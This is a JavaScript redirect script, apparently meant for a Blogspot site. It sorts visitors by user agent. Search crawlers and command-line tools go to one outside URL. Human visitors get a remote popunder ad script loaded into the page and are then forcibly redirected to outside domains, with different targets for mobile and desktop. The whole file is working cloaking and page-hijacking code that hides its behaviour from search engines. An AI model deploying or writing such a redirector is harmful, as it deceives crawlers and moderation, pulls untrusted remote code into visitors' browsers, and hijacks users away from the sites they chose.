// ========================================
// CONFIG
// ========================================
const CONFIG = {
  popunderUrl: '//formationcrucialwildest.com/62/52/8b/62528b16899f546dcfe3d7c652d13893.js',
  botUrl: 'https://formationcrucialwildest.com/ncm6bswk9?key=c557fff9fe194e94c8546b8e66aa5c4c',
  mobileUrl: 'https://rondo.my.id',
  desktopUrl: 'https://formationcrucialwildest.com/ncm6bswk9?key=c557fff9fe194e94c8546b8e66aa5c4c',
  popunderDelay: 500,
  mobileDelay: 1500
};

// ========================================
// FUNGSI DETEKSI
// ========================================
function isBot() {
  const ua = navigator.userAgent.toLowerCase();
  const botKeywords = [
    'bot', 'crawl', 'spider', 'slurp', 'mediapartners', 'google', 
    'bing', 'facebook', 'yahoo', 'curl', 'python', 'http', 'wget', 'java'
  ];
  return botKeywords.some(keyword => ua.includes(keyword));
}

function isMobile() {
  return /android|iphone|ipad|ipod|opera mini|mobile/i.test(navigator.userAgent);
}

// ========================================
// LOAD POPUNDER
// ========================================
function loadPopunder(callback) {
  if (!CONFIG.popunderUrl) {
    if (callback) callback();
    return;
  }
  
  const script = document.createElement('script');
  script.type = 'text/javascript';
  script.src = CONFIG.popunderUrl;
  script.async = true;
  
  script.onload = function() {
    console.log('Popunder loaded');
    if (callback) {
      setTimeout(callback, CONFIG.popunderDelay);
    }
  };
  
  script.onerror = function() {
    console.log('Popunder failed to load');
    if (callback) callback();
  };
  
  (document.head || document.body).appendChild(script);
}

// ========================================
// REDIRECT LOGIC - FIXED untuk Blogspot
// ========================================
(function() {
  // Tunggu DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initRedirect);
  } else {
    // DOM sudah ready, langsung jalankan
    initRedirect();
  }

  function initRedirect() {
    if (isBot()) {
      window.location.href = CONFIG.botUrl;
      return;
    }
    
    loadPopunder(function() {
      if (isMobile()) {
        setTimeout(function() {
          window.location.href = CONFIG.mobileUrl;
        }, CONFIG.mobileDelay);
      } else {
        window.location.href = CONFIG.desktopUrl;
      }
    });
  }
})();
